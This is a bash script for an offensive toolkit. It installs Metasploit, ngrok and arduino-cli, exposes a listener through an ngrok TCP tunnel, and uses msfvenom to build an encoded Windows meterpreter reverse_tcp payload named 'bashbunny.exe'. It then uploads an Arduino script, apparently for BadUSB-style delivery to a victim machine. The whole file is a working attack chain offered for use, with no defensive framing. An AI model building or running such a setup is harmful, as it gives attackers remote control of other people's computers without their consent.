#!/bin/bash

# Global Variables
trap ctrl_c INT

function ctrl_c() {
    echo "[WARNING] Exiting..."
}

function banner() {
    clear
    source banner/banner.sh
}

function help()
{
    echo -e "COMMAND\t\tDESCRIPTION"
    echo ""
    echo -e "-i\t\tInstall dependencies"
    echo -e "-t <token>\tSet the token"
    echo -e "-l <port>\tSet in listener mode in the specified port"
    echo -e "-u\t\tUpload ar"
    echo -e "-k\t\tKill the connection"
    echo -e "-a\t\tSet automatic mode"
    echo -e "-h\t\tShow this help menu"
    echo ""
}

function dependencies()
{
    echo "[INFO] Installing dependencies"
    echo "[INFO] Installing Metasploit..."
    echo "[WARNING] Consider installing: Metasploit Framework Version: 6.2.26-dev"
    which msfconsole > /dev/null
    if [[ $? -eq 0 ]]; then
        echo "[WARNING] Metasploit found. Avoiding installation"
    else
        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall > /dev/null
        
        metasploit=$?
        
        if [[ $metasploit -eq 0 ]]; then
            echo "[INFO] Metasploit installed successfully"
            
        else
            echo "[ERROR] Seems that metasploit could not be installed"
        fi    
    fi
    echo "[INFO] Installing ngrok..."
    which ngrok > /dev/null
    if [[ $? -eq 0 ]]; then
        echo "[WARNING] ngrok found. Avoiding installation"
    else   
        curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update -y && sudo apt install ngrok -y > /dev/null
        if [[ $? -eq 0 ]]; then
            echo "[INFO] ngrok installed successfully"
        else
            echo "[ERROR] Seems that ngrok could not be installed"
        fi
    fi

    echo "[INFO] Installing OpenSSH"
    which ssh > /dev/null
    if [[ $? -eq 0 ]]; then
        echo "[WARNING] SSH Found. Avoiding installation"
    else
        sudo apt install openssh-server -y > /dev/null
        if [[ $? -eq 0 ]]; then
            echo "[INFO] OpenSSH installed successfully"
        else
            echo "[ERROR] Seems that OpenSSH could not be installed"
        fi
    fi

    echo "[INFO] Installing Python 3"
    which python3 > /dev/null
    if [[ $? -eq 0 ]]; then
        echo "[WARNING] Python3 Found. Avoiding installation"
    else
        sudo apt install python3.8 -y > /dev/null
        if [[ $? -eq 0 ]]; then
            echo "[INFO] Python installed successfully"
        else
            echo "[ERROR] Seems that Python could not be installed"
        fi
    fi

    echo "[INFO] Installing Arduino"
    which arduino > /dev/null
    if [[ $? -eq 0 ]]; then
        echo "[WARNING] Arduino found. Avoiding installation"
    else
        git clone https://github.com/arduino/arduino-cli.git > /dev/null
        sudo arduino-cli/./install.sh > /dev/null
        sudo mv arduino-cli/ /usr/bin/ > /dev/null
    fi  

    echo "[INFO] Creating folders"

    if [ ! -d logs ]; then
        echo "[INFO] Seems that you don't have logs folder."
        echo "[WARNING] Creating folder logs/"
        mkdir logs
    else
        echo "[INFO] Folder logs/ found"
    fi
}

function token()
{
    ngrok config add-authtoken $token > /dev/null
    if [[ $? -eq 0 ]]; then
        echo "[INFO] Token added successfully"
    else
        echo "[ERROR] Something went wrong adding the ngrok token."
    fi
}


function listener()
{
    # ngrok set up
    nohup ngrok tcp $port --log=stdout > logs/ngrok.log 2> logs/foo.err < /dev/null &
    if [[ $? -eq 0 ]]; then
        echo "[INFO] Port listener configured successfully"
        export port=$port
        
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$tunnel LPORT=$tunnelport --platform windows -a x86 -e x86/shikata_ga_nai -f exe > bashbunny.exe 2>/dev/null > /dev/null

        bash conf_files/listener.sh
    else
        echo "[ERROR] Something went wrong setting the port"
    fi
}

function kill()
{
    killall ngrok > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo "[INFO] All ngrok connections killed successfully"
    else
        echo "[WARNING] Seems that you don't have any active ngrok connection"
    fi
    
    killall ssh > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo "[INFO] All ssh connections killed successfully"
    else
        echo "[WARNING] Seems that you don't have any active ssh connection"
    fi

    killall python3 > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo "[INFO] All HTTP Python connections killed successfully"
    else
        echo "[WARNING] Seems that you don't have any active HTTP Python connection"
    fi
}

function upload()
{
    echo "[INFO] Uploading Arduino Script"
    bash conf_files/arduino-builder.sh
}

# Start here

banner

for arg
do
    case "$arg" in
        -i)
            dependencies
            ;;
        -k)
            kill
            ;;
        -u)
            upload
            ;;
        -h)
            help
            ;;
    esac
done

# Needs arguments
while getopts :i:h:k:t:l: flag
do
    case "${flag}" in
        # Set token
        t) token=${OPTARG}
        if [[ $token != '' ]]; then
            token
        else
            echo "[ERROR] Please use $0 -t <token> for set token"
        fi
        ;;

        # Set port
        l) port=${OPTARG}
        if [[ $port != '80' ]]; then
            listener
        else
            echo "[ERROR] Please use $0 -p <port>. Don't use port 80."
        fi
        ;;
    esac
done